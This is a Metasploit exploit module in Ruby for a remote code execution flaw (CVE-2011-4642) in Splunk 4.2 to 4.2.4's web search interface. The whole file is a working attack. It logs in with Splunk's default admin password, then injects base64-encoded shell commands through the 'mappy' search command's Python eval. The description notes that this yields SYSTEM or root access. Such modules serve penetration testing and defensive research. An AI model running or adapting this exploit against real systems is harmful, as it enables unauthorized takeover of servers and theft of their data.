##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Splunk Search Remote Code Execution',
      'Description'    => %q{
        This module abuses a command execution vulnerability within the
        web based interface of Splunk 4.2 to 4.2.4. The vulnerability exists
        within the 'mappy' search command which allows to run python code.
        To exploit this vulnerability a valid Splunk user with the admin
        role is required.  Unfortunately, Splunk uses a default credential of
        'admin:changeme' for admin access, which is used to leverage our attack.

        The Splunk Web interface runs as SYSTEM on Windows and as root
        on Linux by default.
      },
      'Author'         =>
        [
          "Gary O'Leary-Steele", # Vulnerability discovery and exploit
          "juan vazquez"         # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '77695' ],
          [ 'BID', '51061' ],
          [ 'CVE', '2011-4642' ],
          [ 'URL', 'http://www.splunk.com/view/SP-CAAAGMM' ],
          [ 'URL', 'http://www.sec-1.com/blog/?p=233' ],
          [ 'URL', 'http://www.sec-1.com/blog/wp-content/uploads/2011/12/Attacking_Splunk_Release.pdf' ],
          [ 'URL', 'http://www.sec-1.com/blog/wp-content/uploads/2011/12/splunkexploit.zip' ]
        ],
      'Payload'        =>
        {
          'Space'       => 1024,
          'Badchars'    => '',
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [
            'Universal CMD',
            {
              'Arch'     => ARCH_CMD,
              'Platform' => ['unix', 'win', 'linux']
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Dec 12 2011'))

      register_options(
        [
          Opt::RPORT(8000),
          OptString.new('USERNAME', [ true, 'The username with admin role to authenticate as','admin' ]),
          OptString.new('PASSWORD', [ true, 'The password for the specified username','changeme' ])
        ], self.class)
  end

  def exploit
    @username = datastore['USERNAME']
    @password = datastore['PASSWORD']
    @auth_cookies = ''
    p = payload.encoded
    print_status("Using command: #{p}")
    cmd = Rex::Text.encode_base64(p)

    print_status("Attempting to login...")
    do_login

    send_request_cgi(
    {
      'uri'     => '/en-US/api/search/jobs',
      'method'  => 'POST',
      'cookie'  => @auth_cookies,
      'headers' =>
        {
          'X-Requested-With' => 'XMLHttpRequest',
          'X-Splunk-Session' => @auth_cookies.split("=")[1]
        },
      'vars_post' =>
        {
          'search' => "search index=_internal source=*splunkd.log |mappy x=eval(\"sys.modules['os'].system(base64.b64decode('#{cmd}'))\")",
          'status_buckets' => "300",
          'earliest_time' => "0",
          'latest_time' => ""
        }
    }, 25)
    handler
  end

  def check
    res = send_request_cgi(
    {
      'uri'     => '/en-US/account/login',
      'method'  => 'GET'
    }, 25)

    if res.body =~ /Splunk Inc\. Splunk 4\.[0-2]\.[0-4] build [\d+]/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def do_login
    res = send_request_cgi(
    {
      'uri'     => '/en-US/account/login',
      'method'  => 'GET'
    }, 25)

    cval = ''
    uid = ''
    session_id_port =
    session_id = ''
    if res and res.code == 200
      res.headers['Set-Cookie'].split(';').each {|c|
        c.split(',').each {|v|
          if v.split('=')[0] =~ /cval/
            cval = v.split('=')[1]
          elsif v.split('=')[0] =~ /uid/
            uid = v.split('=')[1]
          elsif v.split('=')[0] =~ /session_id/
            session_id_port = v.split('=')[0]
            session_id = v.split('=')[1]
          end
        }
      }
    else
      raise RuntimeError, "Unable to get session cookies"
    end

    res = send_request_cgi(
    {
      'uri'     => '/en-US/account/login',
      'method'  => 'POST',
      'cookie'  => "uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}",
      'vars_post' =>
        {
          'cval' => cval,
          'username' => @username,
          'password' => @password
        }
    }, 25)

    if not res or res.code != 303
      raise RuntimeError, "Unable to authenticate"
    else
      session_id_port = ''
      session_id = ''
      res.headers['Set-Cookie'].split(';').each {|c|
        c.split(',').each {|v|
          if v.split('=')[0] =~ /session_id/
            session_id_port = v.split('=')[0]
            session_id = v.split('=')[1]
          end
        }
      }
      @auth_cookies = "#{session_id_port}=#{session_id}"
    end

  end

end
